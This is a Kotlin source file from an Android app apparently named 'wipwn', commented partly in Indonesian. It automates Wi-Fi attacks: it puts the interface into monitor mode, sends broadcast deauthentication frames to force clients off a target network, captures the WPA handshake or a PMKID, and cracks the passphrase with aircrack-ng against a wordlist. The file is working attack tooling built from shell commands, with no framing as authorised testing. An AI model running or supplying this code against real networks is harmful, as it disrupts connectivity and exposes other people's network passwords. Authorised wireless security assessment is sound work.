package com.wipwn.app.repository

import com.wipwn.app.data.WifiNetwork
import com.wipwn.app.util.ShellExecutor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.File

/**
 * WPA/WPA2 Handshake Capture + PMKID Attack.
 *
 * Flow:
 * 1. Set interface ke monitor mode
 * 2. Capture handshake (deauth + sniff) ATAU PMKID (clientless)
 * 3. Save capture file
 * 4. Crack offline pake wordlist
 *
 * Butuh: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng
 * ATAU: hcxdumptool, hcxpcapngtool (buat PMKID)
 *
 * Kalo binary ga ada, fallback ke tcpdump + manual parsing.
 */
class HandshakeCapturer(
    private val shell: ShellExecutor,
    private val onLog: (stage: String, message: String) -> Unit
) {

    data class CaptureResult(
        val success: Boolean,
        val captureFile: String? = null,
        val handshakeFound: Boolean = false,
        val pmkidFound: Boolean = false,
        val error: String? = null
    )

    data class CrackResult(
        val success: Boolean,
        val password: String? = null,
        val method: String? = null,
        val error: String? = null
    )

    private val captureDir = "/data/local/tmp/wipwn_captures"

    /**
     * Check apakah tools yang dibutuhin ada.
     */
    fun checkTools(): Map<String, Boolean> {
        val tools = listOf(
            "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng",
            "hcxdumptool", "hcxpcapngtool", "tcpdump"
        )
        return tools.associateWith { tool ->
            shell.exec("which $tool 2>/dev/null || command -v $tool 2>/dev/null").isSuccess
        }
    }

    /**
     * Enable monitor mode on WiFi interface.
     */
    suspend fun enableMonitorMode(iface: String = "wlan0"): Pair<Boolean, String> {
        return withContext(Dispatchers.IO) {
            onLog("monitor", "Enabling monitor mode on $iface...")

            // Try airmon-ng first
            val airmon = shell.exec("airmon-ng start $iface 2>&1")
            if (airmon.isSuccess) {
                // Detect monitor interface name
                val monIface = shell.exec(
                    "iwconfig 2>/dev/null | grep -i 'mode:monitor' | awk '{print \$1}' | head -1"
                ).out.firstOrNull()?.trim()

                if (!monIface.isNullOrBlank()) {
                    onLog("monitor", "Monitor mode enabled: $monIface")
                    return@withContext true to monIface
                }
            }

            // Fallback: manual iw
            onLog("monitor", "airmon-ng not available, trying manual method...")
            shell.exec("ip link set $iface down")
            val iwResult = shell.exec("iw dev $iface set type monitor")
            shell.exec("ip link set $iface up")

            if (iwResult.isSuccess) {
                onLog("monitor", "Monitor mode enabled manually on $iface")
                return@withContext true to iface
            }

            onLog("monitor", "Failed to enable monitor mode: ${iwResult.stderr}")
            false to iface
        }
    }

    /**
     * Disable monitor mode, restore managed mode.
     */
    suspend fun disableMonitorMode(iface: String = "wlan0") {
        withContext(Dispatchers.IO) {
            onLog("monitor", "Disabling monitor mode...")
            shell.exec("airmon-ng stop $iface 2>/dev/null")
            // Fallback
            shell.exec("ip link set $iface down")
            shell.exec("iw dev $iface set type managed 2>/dev/null")
            shell.exec("ip link set $iface up")
            onLog("monitor", "Managed mode restored")
        }
    }

    /**
     * Send deauthentication frames to force client reconnect.
     */
    suspend fun deauth(
        monIface: String,
        targetBssid: String,
        clientMac: String? = null,
        count: Int = 10
    ) {
        withContext(Dispatchers.IO) {
            val target = clientMac ?: "FF:FF:FF:FF:FF:FF" // broadcast
            onLog("deauth", "Sending $count deauth frames to $targetBssid (client: $target)")

            // Try aireplay-ng
            val aireplay = shell.exec(
                "aireplay-ng --deauth $count -a $targetBssid ${if (clientMac != null) "-c $clientMac" else ""} $monIface 2>&1"
            )

            if (!aireplay.isSuccess) {
                // Fallback: mdk3/mdk4
                onLog("deauth", "aireplay-ng failed, trying mdk4...")
                shell.exec(
                    "echo '$targetBssid' > /tmp/wipwn_deauth_target.txt"
                )
                shell.exec(
                    "timeout ${count * 2} mdk4 $monIface d -b /tmp/wipwn_deauth_target.txt 2>/dev/null"
                )
            }

            onLog("deauth", "Deauth frames sent")
        }
    }

    /**
     * Capture WPA handshake.
     * Combines deauth + packet capture.
     */
    suspend fun captureHandshake(
        network: WifiNetwork,
        monIface: String,
        timeoutSec: Int = 30
    ): CaptureResult {
        return withContext(Dispatchers.IO) {
            shell.exec("mkdir -p $captureDir")
            val prefix = "$captureDir/hs_${network.bssid.replace(":", "")}"

            onLog("capture", "Starting handshake capture for ${network.displayName}")
            onLog("capture", "Channel: ${network.channel}, BSSID: ${network.bssid}")

            // Start capture in background
            val captureCmd = if (shell.exec("which airodump-ng 2>/dev/null").isSuccess) {
                "timeout $timeoutSec airodump-ng --bssid ${network.bssid} -c ${network.channel} -w $prefix $monIface 2>&1 &"
            } else {
                "timeout $timeoutSec tcpdump -i $monIface -w ${prefix}.pcap 'ether host ${network.bssid}' 2>&1 &"
            }

            shell.exec(captureCmd)
            delay(2000)

            // Send deauth to force handshake
            onLog("capture", "Sending deauth to force handshake...")
            deauth(monIface, network.bssid, count = 5)
            delay(3000)
            deauth(monIface, network.bssid, count = 5)

            // Wait for capture
            onLog("capture", "Waiting for handshake (${timeoutSec}s timeout)...")
            delay((timeoutSec * 1000).toLong())

            // Check if handshake was captured
            val capFile = findCaptureFile(prefix)
            if (capFile == null) {
                onLog("capture", "No capture file found")
                return@withContext CaptureResult(
                    success = false,
                    error = "Capture file not found"
                )
            }

            // Verify handshake
            val hasHandshake = verifyHandshake(capFile, network.bssid)
            onLog("capture", if (hasHandshake) "✓ Handshake captured!" else "✗ No handshake in capture")

            CaptureResult(
                success = hasHandshake,
                captureFile = capFile,
                handshakeFound = hasHandshake
            )
        }
    }

    /**
     * PMKID Attack — clientless, ga perlu nungu client connect.
     */
    suspend fun capturePmkid(
        network: WifiNetwork,
        iface: String = "wlan0",
        timeoutSec: Int = 20
    ): CaptureResult {
        return withContext(Dispatchers.IO) {
            shell.exec("mkdir -p $captureDir")
            val outFile = "$captureDir/pmkid_${network.bssid.replace(":", "")}.pcapng"

            onLog("pmkid", "Starting PMKID capture for ${network.displayName}")

            // Try hcxdumptool
            if (shell.exec("which hcxdumptool 2>/dev/null").isSuccess) {
                onLog("pmkid", "Using hcxdumptool...")
                shell.exec(
                    "echo '${network.bssid.replace(":", "")}' > /tmp/wipwn_pmkid_filter.txt"
                )
                shell.exec(
                    "timeout $timeoutSec hcxdumptool -i $iface -o $outFile " +
                    "--filterlist_ap=/tmp/wipwn_pmkid_filter.txt --filtermode=2 " +
                    "--enable_status=1 2>&1"
                )

                val exists = shell.exec("test -f $outFile && echo YES").out.firstOrNull()?.trim() == "YES"
                if (exists) {
                    // Convert to hash
                    val hashFile = "$captureDir/pmkid_hash.txt"
                    shell.exec("hcxpcapngtool -o $hashFile $outFile 2>&1")

                    val hasHash = shell.exec("test -s $hashFile && echo YES").out.firstOrNull()?.trim() == "YES"
                    onLog("pmkid", if (hasHash) "✓ PMKID captured!" else "✗ No PMKID found")

                    return@withContext CaptureResult(
                        success = hasHash,
                        captureFile = if (hasHash) hashFile else outFile,
                        pmkidFound = hasHash
                    )
                }
            }

            onLog("pmkid", "hcxdumptool not available — PMKID capture requires it")
            CaptureResult(
                success = false,
                error = "hcxdumptool not installed. Install via: pkg install hcxdumptool"
            )
        }
    }

    /**
     * Crack captured handshake/PMKID with wordlist.
     */
    suspend fun crackWithWordlist(
        captureFile: String,
        bssid: String,
        wordlistPath: String = DEFAULT_WORDLIST
    ): CrackResult {
        return withContext(Dispatchers.IO) {
            onLog("crack", "Starting crack with wordlist: $wordlistPath")

            // Check wordlist exists
            val wlExists = shell.exec("test -f $wordlistPath && echo YES").out.firstOrNull()?.trim() == "YES"
            if (!wlExists) {
                onLog("crack", "Wordlist not found: $wordlistPath")
                return@withContext CrackResult(
                    success = false,
                    error = "Wordlist not found: $wordlistPath"
                )
            }

            // Try aircrack-ng
            if (shell.exec("which aircrack-ng 2>/dev/null").isSuccess) {
                onLog("crack", "Using aircrack-ng...")
                val result = shell.exec(
                    "aircrack-ng -b $bssid -w $wordlistPath $captureFile 2>&1"
                )

                val keyLine = result.out.find { it.contains("KEY FOUND") }
                if (keyLine != null) {
                    val password = keyLine.substringAfter("[").substringBefore("]").trim()
                    onLog("crack", "✓ Password found: $password")
                    return@withContext CrackResult(
                        success = true,
                        password = password,
                        method = "aircrack-ng + wordlist"
                    )
                }
            }

            onLog("crack", "✗ Password not found in wordlist")
            CrackResult(
                success = false,
                error = "Password not found in wordlist"
            )
        }
    }

    private fun findCaptureFile(prefix: String): String? {
        val extensions = listOf(".cap", "-01.cap", ".pcap", ".pcapng")
        for (ext in extensions) {
            val check = shell.exec("test -f ${prefix}${ext} && echo YES")
            if (check.out.firstOrNull()?.trim() == "YES") {
                return "${prefix}${ext}"
            }
        }
        return null
    }

    private fun verifyHandshake(capFile: String, bssid: String): Boolean {
        // Try aircrack-ng verification
        val result = shell.exec("aircrack-ng $capFile 2>&1")
        return result.out.any {
            it.contains("handshake", ignoreCase = true) &&
            it.contains(bssid.replace(":", ""), ignoreCase = true)
        }
    }

    companion object {
        const val DEFAULT_WORDLIST = "/data/local/tmp/wipwn_wordlist.txt"
        const val ROCKYOU_PATH = "/sdcard/wordlists/rockyou.txt"
    }
}
